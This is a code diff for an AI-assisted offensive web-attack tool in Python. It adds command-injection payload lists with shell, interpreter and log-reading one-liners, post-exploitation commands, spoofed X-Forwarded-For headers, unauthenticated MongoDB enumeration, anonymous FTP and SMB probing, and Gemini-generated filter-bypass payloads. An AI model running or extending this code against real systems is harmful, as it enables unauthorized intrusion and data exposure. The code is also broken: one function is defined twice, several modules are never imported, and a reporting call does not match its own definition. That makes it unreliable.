@@ -1,4 +1,5 @@
 import os
+import asyncio
 import subprocess
 import configparser
 import google.genai as genai
@@ -9,10 +10,35 @@ import threading
 import queue
 import socket # Added for HTTP Smuggling module
 import requests # Added for SQLi module
+import pymongo # Added for MongoDB module
 import re # Added for SQLi module
 import json # Added for SQLi module
-from urllib.parse import quote_plus # Added for SQLi module
+from bs4 import BeautifulSoup # Added for React2Shell module
+from urllib.parse import quote_plus, urlparse, urljoin, unquote # Added urlparse, urljoin, unquote
+import tempfile
+import random # Added for get_random_string
+import string # Added for get_random_string
 
+# Helper function to generate random strings
+def get_random_string(length):
+    characters = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(characters) for i in range(length))
+
+# Helper function to normalize target URL
+def normalize_target(target):
+    if not target.startswith(('http://', 'https://')):
+        return f"http://{target}"
+    return target
+
+# Helper function to extract domain from target URL
+def get_domain(target):
+    parsed_url = urlparse(target)
+    return parsed_url.netloc.split(':')[0]
+
+
+
+# Placeholder for AI decision making and dynamic payload generation
+# These functions will be expanded later as per the user's request.
 # Placeholder for detailed reporting
 class Report:
     def __init__(self):
@@ -26,6 +52,11 @@ class Report:
         if finding.get("poc_code"):
             return finding["poc_code"]
         return "# PoC code generation not implemented for this finding type yet."
+
+# Placeholder for output
+class Output:
+    def print(self, message):
+        print(message) # Using print for now, can be adapted to log_message if needed
 
     def generate_report(self, filename="penetration_test_report.md"):
         print(f"[+] Generating report: {filename}")
@@ -65,9 +96,580 @@ class Report:
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         })
 
-# Placeholder for AI decision making and dynamic payload generation
-# These functions will be expanded later as per the user's request.
+
+async def perform_exposed_services_attack(target, output, tech, report, session_cookies=None, nmap_output_file=None):
+    """
+    Parses an Nmap output file and runs specific checks on discovered open services.
+    This function is now fully asynchronous.
+    """
+    output.print(f"\n[+] Starting Exposed Services Scan based on Nmap results for {target}...")
+
+    if not nmap_output_file or not os.path.exists(nmap_output_file):
+        output.print(f"  [WARNING] Nmap output file not found at '{nmap_output_file}'. Cannot perform exposed services scan.")
+        report.add_finding({
+            "type": "Exposed Services Scan",
+            "severity": "Info",
+            "url": target,
+            "param": "N/A",
+            "payload": "N/A",
+            "description": "Skipped (Nmap file not found)",
+            "recommendation": "Ensure Nmap scan is performed and output file is provided.",
+            "response_snippet": "N/A"
+        })
+        return
+
+    try:
+        with open(nmap_output_file, 'r') as f:
+            nmap_content = f.read()
+
+        service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
+        services_to_attack = []
+        for line in nmap_content.splitlines():
+            match = service_pattern.search(line)
+            if match:
+                port = int(match.group(1))
+                protocol = match.group(2)
+                service = match.group(3).lower()
+                services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})
+
+        if not services_to_attack:
+            output.print("  [INFO] No relevant open services found in Nmap output for exposed services scan.")
+            report.add_finding({
+                "type": "Exposed Services Scan",
+                "severity": "Info",
+                "url": target,
+                "param": "N/A",
+                "payload": "N/A",
+                "description": "Completed (No open services)",
+                "recommendation": "N/A",
+                "response_snippet": "N/A"
+            })
+            return
+
+        output_dir = os.path.dirname(nmap_output_file)
+        tasks = []
+
+        for service_info in services_to_attack:
+            port = service_info['port']
+            service_name = service_info['service']
+            
+            if 'ftp' in service_name:
+                tasks.append(_ftp_anonymous_login(target, port, output_dir, report, output))
+            elif 'netbios-ssn' in service_name or 'microsoft-ds' in service_name:
+                tasks.append(_smb_anonymous_share(target, port, output_dir, report, output))
+            # Add other async service checks here as needed, e.g., for SSH, Telnet, SMTP.
+            # For now, focusing on fixing the existing logic for FTP and SMB.
+
+        if tasks:
+            await asyncio.gather(*tasks)
+
+    except Exception as e:
+        output.print(f"  [ERROR] An error occurred during exposed services scan: {e}")
+        report.add_finding({
+            "type": "Exposed Services Scan",
+            "severity": "Error",
+            "url": target,
+            "param": "N/A",
+            "payload": "N/A",
+            "description": f"Error: {e}",
+            "recommendation": "Review error logs and Nmap output.",
+            "response_snippet": str(e)
+        })
+
+    output.print(f"[+] Exposed Services Scan for {target} Finished.")
+
+async def _send_http_request(url, method='GET', data=None, headers=None, cookies=None, timeout=10, verify_ssl=True, allow_redirects=True, output=None, session_cookies=None):
+    """
+    Synchronous HTTP request function using requests library.
+    Mimics the async _send_async_http_request from rap0at.py for compatibility.
+    """
+    req_headers = {
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
+        ]),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+        'Via': '1.1 google'
+    }
+    if headers:
+        req_headers.update(headers)
+    
+    req_cookies = cookies if cookies else {}
+    if session_cookies:
+        req_cookies.update(session_cookies)
+
+    request_details = {
+        'url': url,
+        'method': method,
+        'headers': req_headers,
+        'data': data
+    }
+    response_details = {
+        'status_code': None,
+        'headers': {},
+        'text': None,
+        'error': None
+    }
+
+    try:
+        if method.upper() == 'GET':
+            res = requests.get(url, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
+        elif method.upper() == 'POST':
+            res = requests.post(url, data=data, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
+        else:
+            res = requests.request(method, url, data=data, headers=req_headers, cookies=req_cookies, timeout=timeout, verify=verify_ssl, allow_redirects=allow_redirects)
+        
+        response_details['status_code'] = res.status_code
+        response_details['headers'] = dict(res.headers)
+        response_details['text'] = res.text
+        return res, request_details, response_details
+    except requests.exceptions.Timeout:
+        error_msg = f"Request to {url} timed out."
+        if output: output.print(f"    [ERROR] {error_msg}")
+        response_details['error'] = error_msg
+    except requests.exceptions.ConnectionError as e:
+        error_msg = f"Connection error to {url}: {e}"
+        if output: output.print(f"    [ERROR] {error_msg}")
+        response_details['error'] = error_msg
+    except requests.exceptions.RequestException as e:
+        error_msg = f"Unexpected requests error for {url}: {e}"
+        if output: output.print(f"    [ERROR] {error_msg}")
+        response_details['error'] = error_msg
+    except Exception as e:
+        error_msg = f"An unexpected error occurred during HTTP request to {url}: {e}"
+        if output: output.print(f"    [ERROR] {error_msg}")
+        response_details['error'] = error_msg
+    return None, request_details, response_details
+
+def get_encoded_payloads(payload):
+    """다양한 인코딩으로 페이로드 목록 생성"""
+    encoded_payloads = {payload}
+    try:
+        encoded_payloads.add(quote(payload))
+        encoded_payloads.add(quote(quote(payload)))
+        encoded_payloads.add(base64.b64encode(payload.encode()).decode().strip())
+        encoded_payloads.add(html.escape(payload))
+    except Exception:
+        pass
+    return list(encoded_payloads)
+
+def build_request(base_url, method, param_name, payload, original_form_data=None, original_url_query=None, use_hpp=False):
+    """향상된 요청 빌더 (HPP 지원)"""
+    method = method.lower()
+    
+    # HPP 페이로드 구성
+    if use_hpp:
+        # HPP를 위해 페이로드와 랜덤 문자열을 동일 파라미터로 전달
+        hpp_payload = f"{payload}&{param_name}={get_random_string(5)}"
+    else:
+        hpp_payload = payload
+
+    if method == 'get':
+        parsed_url = urlparse(base_url)
+        # 기존 쿼리를 유지하면서 대상 파라미터를 수정하거나 추가
+        query_params = []
+        param_found = False
+        if original_url_query:
+            # URL 디코딩된 쿼리 문자열을 파싱
+            params = unquote(original_url_query).split('&')
+            for p_str in params:
+                if '=' not in p_str:
+                    query_params.append(p_str)
+                    continue
+                
+                key, val = p_str.split('=', 1)
+                if key == param_name:
+                    # HPP 페이로드를 적용하고 인코딩
+                    query_params.append(f"{key}={quote(hpp_payload)}")
+                    param_found = True
+                else:
+                    query_params.append(f"{key}={quote(val)}")
+        
+        if not param_found:
+            query_params.append(f"{param_name}={quote(hpp_payload)}")
+
+        test_url = parsed_url._replace(query="&".join(query_params)).geturl()
+        return test_url, None
+    
+    else: # POST, PUT, etc.
+        post_data = original_form_data.copy() if original_form_data else {}
+        
+        if use_hpp and param_name in post_data:
+            # HPP의 경우, 기존 값과 새 페이로드를 리스트로 만들어 전달 (일부 프레임워크에서 지원)
+            # 또는 application/x-www-form-urlencoded 형식으로 직접 구성
+            # 여기서는 간단하게 덮어쓰되, 실제 요청 라이브러리가 리스트를 지원하면 더 효과적
+            # requests 라이브러리는 동일 키에 대해 여러 값을 보내려면 튜플 리스트를 사용해야 함
+            # 여기서는 문자열 연결로 HPP를 시뮬레이션
+            post_data[param_name] = hpp_payload 
+        else:
+            post_data[param_name] = payload
+            
+        return base_url, post_data
+
+async def perform_cmdi_attack(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+    output.print(f"\n[+] Starting Hybrid Command Injection Scan...")
+    marker = f"CMD{get_random_string(4)}"
+    
+    # Payloads for legacy full scan
+    full_payloads = [
+        f"| echo {marker}", f"; echo {marker}", f"&& echo {marker}", f"|| echo {marker}",
+        f"| zgrep 'root' /var/log/auth.log.gz",
+        f"| journalctl",
+        f"| systemctl status",
+        f"| docker ps",
+        f"| kubectl get pods",
+        f"| python -c 'import os; os.system(\"echo {marker}\")'",
+        f"| perl -e 'system(\"echo {marker}\")'",
+        f"| ruby -e 'system(\"echo {marker}\")'",
+        f"| php -r 'system(\"echo {marker}\");'",
+        f"| node -e 'require(\"child_process\").execSync(\"echo {marker}\")'",
+        f"| lua -e 'os.execute(\"echo {marker}\")'",
+        f"| go run -exec 'echo {marker}'",
+        f"| rustc - -o /tmp/a && /tmp/a",
+        f"| gcc -o /tmp/a -xc - && /tmp/a",
+        f"| tclsh <<< 'exec echo {marker}'",
+        f"| groovy -e '\"echo {marker}\".execute()'"
+    ]
+    
+    async def run_post_exploitation(point, vuln_payload, initial_evidence_res):
+        output.print(f"    [+] Command Injection Confirmed! Starting Post-Exploitation on param '{point['param']}'...")
+        evidence = f"Initial detection response with marker '{marker}':\n---\n{(initial_evidence_res.text)[:300]}\n---\n\n"
+        
+        poc_commands = {
+            "unix": ["whoami", "id", "uname -a", "pwd", "ls -la"],
+            "windows": ["whoami", "ver", "ipconfig", "dir"]
+        }
+        detected_os = "windows" if "windows" in tech.get('os', '').lower() else "unix"
+        
+        evidence += f"Attempting PoC commands for {detected_os} OS...\n"
+        
+        for cmd in poc_commands[detected_os]:
+            # Replace the original echo command with the new PoC command
+            cmd_payload = vuln_payload.replace(f"echo {marker}", cmd)
+            exploit_url, exploit_data = build_request(point['url'], point['method'], point['param'], point['value'] + cmd_payload, point['form_data'], point['original_query'])
+            res_exploit, req_details, resp_details = await _send_http_request(exploit_url, method=point['method'], data=exploit_data, output=output, session_cookies=session_cookies)
+            
+            if res_exploit and (res_exploit.text):
+                soup = BeautifulSoup(res_exploit.text, "html.parser")
+                clean_output = soup.get_text(separator="\n").strip().replace(marker, "")
+                if len(clean_output) > 0 and cmd not in clean_output and "not found" not in clean_output.lower() and "<!DOCTYPE" not in clean_output:
+                    output.print(f"      [SUCCESS] Executed '{cmd}': {clean_output.splitlines()[0]}")
+                    evidence += f"\n---[ Output of '{cmd}' ]---\n{clean_output}\n"
+        
+        report.add_finding("Command Injection (RCE)", "Critical", point['url'], point['param'], vuln_payload, 
+                           "The application is vulnerable to OS Command Injection, allowing an attacker to execute arbitrary commands on the server.", 
+                           "Use safe APIs that do not invoke shell commands. Implement strict, allow-list based input validation.", 
+                           evidence, future_vector="A webshell can be uploaded for persistent access, or a reverse shell can be established.", method=point['method'])
+
+    async def run_smart_probe(point):
+        output.print(f"  [Phase 1] Running Smart Probe for Command Injection on param '{point['param']}'...")
+        
+        # 1. Reflection-based probe
+        probe_payload = f"; echo {marker}"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        if res and (res.text) and marker in res.text:
+            await run_post_exploitation(point, probe_payload, res)
+            return True
+
+        # 2. Time-based probe
+        time_probe_payload = "; sleep 10" # Unix-specific, but common
+        start_time = time.time()
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + time_probe_payload, point['form_data'], point['original_query'])
+        await _send_http_request(test_url, method=point['method'], data=test_data, timeout=12, output=output, session_cookies=session_cookies)
+        duration = time.time() - start_time
+        if duration > 9.5 and duration < 11.5:
+            output.print(f"    [CRITICAL] Time-Based Blind Command Injection confirmed with probe: '{time_probe_payload}'")
+            evidence = f"Response time was {duration:.2f} seconds, indicating successful execution of a time-delay payload (e.g., sleep 10)."
+            report.add_finding("Blind Command Injection (Time-Based)", "Critical", point['url'], point['param'], time_probe_payload, "The application is vulnerable to time-based blind OS command injection.", "Use safe APIs that do not invoke shell commands.", evidence, method=point['method'])
+            return True
+            
+        return False
+
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for Command Injection on param '{point['param']}'...")
+        probe_payload = f"| echo {marker}"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        response_snippet = (res.text)[:500] if res and (res.text) else "No response from server."
+
+        ai_payloads = await ai_generate_dynamic_payloads("Command Injection", probe_payload, response_snippet, output)
+        for p in ai_payloads:
+            test_url_ai, test_data_ai = build_request(point['url'], point['method'], point['param'], point['value'] + p, point['form_data'], point['original_query'])
+            res_ai, _, _ = await _send_http_request(test_url_ai, method=point['method'], data=test_data_ai, output=output, session_cookies=session_cookies)
+            if res_ai and (res_ai.text) and marker in res_ai.text:
+                output.print(f"    [CRITICAL] AI-Generated Command Injection confirmed with payload: {p}")
+                await run_post_exploitation(point, p, res_ai)
+                return True
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for Command Injection on param '{point['param']}'...")
+        for p in full_payloads:
+            if f"echo {marker}" not in p: continue
+            for encoded_p in get_encoded_payloads(p):
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
+                res, _, _ = await _send_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+                if res and (res.text) and marker in res.text:
+                    await run_post_exploitation(point, encoded_p, res)
+                    return True
+        return False
+
+    # --- Main Orchestration Logic ---
+    attack_points = []
+    parsed_target = urlparse(target)
+    base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
+    identified_params = set()
+
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
+        for p_str in params:
+            if '=' not in p_str: continue
+            param_name, value = p_str.split('=', 1)
+            attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+            identified_params.add(param_name)
+
+    if form_to_test:
+        action_url = urljoin(target, form_to_test['action'])
+        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
+        for input_field in form_to_test['inputs']:
+            if input_field['type'] in ['submit', 'hidden']: continue
+            param_name = input_field['name']
+            original_value = input_field.get('value', 'test')
+            attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': param_name, 'value': original_value, 'form_data': form_data, 'original_query': None})
+            identified_params.add(param_name)
+
+    if not (parsed_target.query or form_to_test):
+        cmd_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['exec', 'cmd', 'run', 'ping', 'query', 'call', 'do', 'test', 'file', 'load', 'read'])]
+        for param_name in cmd_params[:50]: # Limit active guessing
+            if param_name not in identified_params:
+                attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': 'test', 'form_data': None, 'original_query': None})
+
+    for point in attack_points:
+        output.print(f"  [*] Testing Command Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        vulnerability_found = await run_smart_probe(point)
+        if vulnerability_found:
+            continue
+
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
+        
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+            
+        report.add_check(f"Command Injection on param '{point['param']}' at {point['url']}", "No vulnerability found")
+
+    output.print("  [INFO] Command Injection scan completed.")
+
+async def perform_mongodb_attack(target, output, tech, report, session_cookies=None):
+    output.print("\n[+] Starting MongoDB Scan & Exploit...")
+    domain = get_domain(normalize_target(target))
+    port = 27017
+    output.print(f"  [*] Attempting to connect to MongoDB on {domain}:{port}...")
+    
+    loop = asyncio.get_event_loop()
+    try:
+        # pymongo.MongoClient is synchronous, so run it in a separate thread
+        client = await loop.run_in_executor(None, lambda: pymongo.MongoClient(domain, port, serverSelectionTimeoutMS=5000))
+        await loop.run_in_executor(None, client.server_info) # Triggers connection
+        output.print(f"  [HIGH] Anonymous connection to MongoDB at {domain}:{port} successful!")
+        db_list = await loop.run_in_executor(None, client.list_database_names)
+        evidence = f"Successfully connected to MongoDB at {domain}:{port} without authentication.\n"
+        evidence += f"Available databases: {db_list}"
+        output.print(f"    [SUCCESS] Found databases: {db_list}")
+        report.add_finding({
+            "type": "MongoDB Anonymous Access",
+            "severity": "High",
+            "url": f"{domain}:{port}",
+            "param": "N/A",
+            "payload": "N/A",
+            "description": "The MongoDB server allows anonymous connections, potentially exposing all database contents.",
+            "recommendation": "Enforce authentication on the MongoDB server. Bind to localhost if remote access is not required.",
+            "response_snippet": evidence
+        })
+        await loop.run_in_executor(None, client.close)
+    except pymongo.errors.ServerSelectionTimeoutError:
+        output.print("  [INFO] MongoDB connection timed out. Server is likely not running or firewalled.")
+        report.add_finding({
+            "type": "MongoDB Scan",
+            "severity": "Info",
+            "url": f"{domain}:{port}",
+            "param": "N/A",
+            "payload": "N/A",
+            "description": "MongoDB connection timed out. Server is likely not running or firewalled.",
+            "recommendation": "Verify MongoDB service status and firewall rules.",
+            "response_snippet": "Connection timed out."
+        })
+    except pymongo.errors.ConnectionFailure as e:
+        output.print(f"  [INFO] MongoDB connection failed: {e}. Authentication may be required.")
+        report.add_finding({
+            "type": "MongoDB Scan",
+            "severity": "Info",
+            "url": f"{domain}:{port}",
+            "param": "N/A",
+            "payload": "N/A",
+            "description": f"MongoDB connection failed: {e}. Authentication may be required.",
+            "recommendation": "Attempt authentication with known credentials or brute-force.",
+            "response_snippet": str(e)
+        })
+    except Exception as e:
+        output.print(f"  [ERROR] An unexpected error occurred during MongoDB scan: {e}")
+        report.add_finding({
+            "type": "MongoDB Scan",
+            "severity": "Error",
+            "url": f"{domain}:{port}",
+            "param": "N/A",
+            "payload": "N/A",
+            "description": f"An unexpected error occurred during MongoDB scan: {e}",
+            "recommendation": "Review error logs.",
+            "response_snippet": str(e)
+        })
+    
+
+
+async def _ftp_anonymous_login(target, port, output_dir, report, output):
+    """Async helper to check for anonymous FTP login."""
+    output.print(f"    [*] Attempting anonymous FTP login on {target}:{port}")
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
+        writer.write(b"USER anonymous\r\n")
+        await writer.drain()
+        await reader.read(1024)
+        writer.write(b"PASS anonymous\r\n")
+        await writer.drain()
+        res_pass = await reader.read(1024)
+        if b"230" in res_pass:
+            output.print(f"      [HIGH] Anonymous FTP login successful on {target}:{port}.")
+            report.add_finding({
+                "type": "Anonymous FTP Access",
+                "severity": "High",
+                "url": f"{target}:{port}",
+                "param": "FTP Login",
+                "payload": "anonymous:anonymous",
+                "description": "Anonymous FTP access is enabled, potentially exposing files.",
+                "recommendation": "Disable anonymous FTP access if not required.",
+                "response_snippet": f"Response: {res_pass.decode(errors='ignore')}"
+            })
+        writer.close()
+        await writer.wait_closed()
+    except Exception as e:
+        output.print(f"      [ERROR] FTP check on {target}:{port} failed: {e}")
+
+async def _smb_anonymous_share(target, port, output_dir, report, output):
+    """Async helper to check for anonymous SMB shares."""
+    output.print(f"    [*] Checking for anonymous SMB shares on {target}:{port}")
+    try:
+        proc = await asyncio.create_subprocess_exec('smbclient', '-L', f'//{target}', '-N', '-p', str(port), stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
+        smb_output = stdout.decode(errors='ignore')
+        if proc.returncode == 0 and "Disk" in smb_output:
+            output.print(f"      [HIGH] Anonymous SMB share listing successful on {target}:{port}.")
+            report.add_finding({
+                "type": "Anonymous SMB Share Listing",
+                "severity": "High",
+                "url": f"{target}:{port}",
+                "param": "SMB",
+                "payload": "Anonymous",
+                "description": "SMB server allows anonymous listing of shares.",
+                "recommendation": "Disable anonymous access to SMB shares.",
+                "response_snippet": f"smbclient output:\n{smb_output}"
+            })
+    except FileNotFoundError:
+        output.print("      [WARNING] `smbclient` not found. Skipping SMB check.")
+    except Exception as e:
+        output.print(f"      [ERROR] SMB check on {target}:{port} failed: {e}")
+
+async def perform_exposed_services_attack(target, output, tech, report, session_cookies=None, nmap_output_file=None):
+    """
+    Parses an Nmap output file and runs specific checks on discovered open services.
+    This function is now fully asynchronous.
+    """
+    output.print(f"\n[+] Starting Exposed Services Scan based on Nmap results for {target}...")
+
+    if not nmap_output_file or not os.path.exists(nmap_output_file):
+        output.print(f"  [WARNING] Nmap output file not found at '{nmap_output_file}'. Cannot perform exposed services scan.")
+        report.add_finding({
+            "type": "Exposed Services Scan",
+            "severity": "Info",
+            "url": target,
+            "param": "N/A",
+            "payload": "N/A",
+            "description": "Skipped (Nmap file not found)",
+            "recommendation": "Ensure Nmap scan is performed and output file is provided.",
+            "response_snippet": "N/A"
+        })
+        return
+
+    try:
+        with open(nmap_output_file, 'r') as f:
+            nmap_content = f.read()
+
+        service_pattern = re.compile(r"(\d+)/(tcp|udp)\s+open\s+(\S+)")
+        services_to_attack = []
+        for line in nmap_content.splitlines():
+            match = service_pattern.search(line)
+            if match:
+                port = int(match.group(1))
+                protocol = match.group(2)
+                service = match.group(3).lower()
+                services_to_attack.append({'port': port, 'protocol': protocol, 'service': service})
+
+        if not services_to_attack:
+            output.print("  [INFO] No relevant open services found in Nmap output for exposed services scan.")
+            report.add_finding({
+                "type": "Exposed Services Scan",
+                "severity": "Info",
+                "url": target,
+                "param": "N/A",
+                "payload": "N/A",
+                "description": "Completed (No open services)",
+                "recommendation": "N/A",
+                "response_snippet": "N/A"
+            })
+            return
+
+        output_dir = os.path.dirname(nmap_output_file)
+        tasks = []
+
+        for service_info in services_to_attack:
+            port = service_info['port']
+            service_name = service_info['service']
+            
+            if 'ftp' in service_name:
+                tasks.append(_ftp_anonymous_login(target, port, output_dir, report, output))
+            elif 'netbios-ssn' in service_name or 'microsoft-ds' in service_name:
+                tasks.append(_smb_anonymous_share(target, port, output_dir, report, output))
+            # Add other async service checks here as needed, e.g., for SSH, Telnet, SMTP.
+            # For now, focusing on fixing the existing logic for FTP and SMB.
+
+        if tasks:
+            await asyncio.gather(*tasks)
+
+    except Exception as e:
+        output.print(f"  [ERROR] An error occurred during exposed services scan: {e}")
+        report.add_finding({
+            "type": "Exposed Services Scan",
+            "severity": "Error",
+            "url": target,
+            "param": "N/A",
+            "payload": "N/A",
+            "description": f"Error: {e}",
+            "recommendation": "Review error logs and Nmap output.",
+            "response_snippet": str(e)
+        })
+
+    output.print(f"[+] Exposed Services Scan for {target} Finished.")
+
+
 def ai_analyze_scan_results(scan_results):
+    
+    
     """
     AI analyzes scan results to determine the most effective attack modules and payloads.
     This function parses Nmap, Nikto, and Nuclei scan results to identify technologies,
@@ -78,82 +680,13 @@ def ai_analyze_scan_results(scan_results):
     detected_technologies = []
     open_ports = []
     potential_vulnerabilities = []
-
-    # --- Parse Nmap Results ---
-    nmap_output = scan_results.get('nmap', '')
-    if nmap_output:
-        # Detect open ports
-        for match in re.finditer(r"(\d+)/(tcp|udp)\s+open", nmap_output):
-            port = match.group(1)
-            protocol = match.group(2)
-            open_ports.append(f"{port}/{protocol}")
-        
-        # Detect services/technologies
-        if "Apache" in nmap_output:
-            detected_technologies.append("Apache")
-        if "nginx" in nmap_output:
-            detected_technologies.append("nginx")
-        if "Microsoft IIS" in nmap_output:
-            detected_technologies.append("IIS")
-        if "PHP" in nmap_output:
-            detected_technologies.append("PHP")
-        if "MySQL" in nmap_output:
-            detected_technologies.append("MySQL")
-        if "PostgreSQL" in nmap_output:
-            detected_technologies.append("PostgreSQL")
-        if "Microsoft SQL Server" in nmap_output:
-            detected_technologies.append("MSSQL")
-        if "Oracle" in nmap_output:
-            detected_technologies.append("Oracle")
-        if "Redis" in nmap_output:
-            detected_technologies.append("Redis")
-        if "SSH" in nmap_output:
-            detected_technologies.append("SSH")
-        if "FTP" in nmap_output:
-            detected_technologies.append("FTP")
-        if "SMTP" in nmap_output:
-            detected_technologies.append("SMTP")
-        if "Telnet" in nmap_output:
-            detected_technologies.append("Telnet")
-
-    # --- Parse Nikto Results ---
-    nikto_output = scan_results.get('nikto', '')
-    if nikto_output:
-        if "XSS" in nikto_output or "Cross Site Scripting" in nikto_output:
-            potential_vulnerabilities.append("XSS")
-        if "SQL Injection" in nikto_output:
-            potential_vulnerabilities.append("SQL Injection")
-        if "File Inclusion" in nikto_output:
-            potential_vulnerabilities.append("LFI/RFI")
-        if "Remote Code Execution" in nikto_output:
-            potential_vulnerabilities.append("RCE")
-        if "Server-Side Request Forgery" in nikto_output:
-            potential_vulnerabilities.append("SSRF")
-        if "XML External Entity" in nikto_output:
-            potential_vulnerabilities.append("XXE")
-        if "Template Injection" in nikto_output:
-            potential_vulnerabilities.append("SSTI")
-        if "Login Form" in nikto_output:
-            potential_vulnerabilities.append("Login Form")
-
-    # --- Parse Nuclei Results ---
-    nuclei_output = scan_results.get('nuclei', '')
-    if nuclei_output:
-        # Nuclei output is often structured, but for simplicity, we'll do keyword matching
-        if "xss" in nuclei_output.lower():
-            potential_vulnerabilities.append("XSS")
-        if "sql-injection" in nuclei_output.lower():
-            potential_vulnerabilities.append("SQL Injection")
-        if "lfi" in nuclei_output.lower() or "rfi" in nuclei_output.lower():
-            potential_vulnerabilities.append("LFI/RFI")
-        if "ssrf" in nuclei_output.lower():
-            potential_vulnerabilities.append("SSRF")
-        if "xxe" in nuclei_output.lower():
-            potential_vulnerabilities.append("XXE")
-        if "ssti" in nuclei_output.lower():
-            potential_vulnerabilities.append("SSTI")
-        if "login" in nuclei_output.lower() or "auth" in nuclei_output.lower():
-            potential_vulnerabilities.append("Login Form")
+    cve_ids = [] # NEW: Initialize list for CVE IDs
+    
+    # NEW: Extract CVE IDs from Nuclei output
+    nuclei_output = scan_results.get('nuclei_output', '') # Get nuclei_output from scan_results
+    if nuclei_output: # Only process if nuclei_output is not empty
+        found_cves = re.findall(r'CVE-\d{4}-\d{4,7}', nuclei_output)
+        cve_ids.extend(list(set(found_cves))) # Add unique CVEs
 
     # --- Prioritize Attacks based on findings ---
 
@@ -172,6 +705,8 @@ def ai_analyze_scan_results(scan_results):
         prioritized_attacks.append("perform_ssti_attack")
     if "Login Form" in potential_vulnerabilities:
         prioritized_attacks.append("perform_brute_force_login")
+    if "Command Injection" in potential_vulnerabilities: # Added for CMDi
+        prioritized_attacks.append("perform_cmdi_attack") # Added for CMDi
 
     # NEW: Prioritize IDOR if numeric IDs are found in URLs
     if any(re.search(r'[?&](id|user_id|item_id|file_id|page_id)=\d+', url) for url in scan_results.get('spider_urls', [])):
@@ -184,19 +719,26 @@ def ai_analyze_scan_results(scan_results):
     # Add attacks based on detected technologies if no direct vulns found yet
     if not prioritized_attacks:
         if "PHP" in detected_technologies:
-            prioritized_attacks.extend(["perform_lfi_rfi_attack", "perform_ssti_attack"]) # PHP often vulnerable to these
+            prioritized_attacks.extend(["perform_lfi_rfi_attack", "perform_ssti_attack", "perform_cmdi_attack"]) # PHP often vulnerable to these
         if "MySQL" in detected_technologies or "PostgreSQL" in detected_technologies or "MSSQL" in detected_technologies or "Oracle" in detected_technologies:
             prioritized_attacks.append("perform_sqli_attack")
         if "Apache" in detected_technologies or "nginx" in detected_technologies or "IIS" in detected_technologies:
-            prioritized_attacks.extend(["perform_xss_attack", "perform_ssrf_attack"]) # Web servers are common targets
+            prioritized_attacks.extend(["perform_xss_attack", "perform_ssrf_attack", "perform_cmdi_attack"]) # Web servers are common targets
 
     # Ensure unique attacks and a default if nothing specific is found
     prioritized_attacks = list(dict.fromkeys(prioritized_attacks)) # Remove duplicates while preserving order
     if not prioritized_attacks:
-        prioritized_attacks.extend(["perform_sqli_attack", "perform_xss_attack"]) # Default to common web attacks
+        prioritized_attacks.extend(["perform_sqli_attack", "perform_xss_attack", "perform_cmdi_attack"]) # Default to common web attacks
 
     print(f"[AI] Prioritized attacks: {prioritized_attacks}")
-    return {"prioritized_attacks": prioritized_attacks, "detected_technologies": detected_technologies, "open_ports": open_ports, "potential_vulnerabilities": potential_vulnerabilities}
+    # NEW: Return separated attack plans
+    return {
+        "generic_attacks": prioritized_attacks,
+        "cve_attacks": cve_ids,
+        "detected_technologies": detected_technologies,
+        "open_ports": open_ports,
+        "potential_vulnerabilities": potential_vulnerabilities
+    }
 
 def ai_generate_dynamic_payloads(server_response, vulnerability_type):
     """
@@ -288,6 +830,109 @@ def ai_generate_dynamic_payloads(server_response, vulnerability_type):
             dynamic_payloads.append("<script>alert('XSS')</script>")
 
     return dynamic_payloads
+
+
+def exploit_cve(cve_id, target, report, output):
+    """
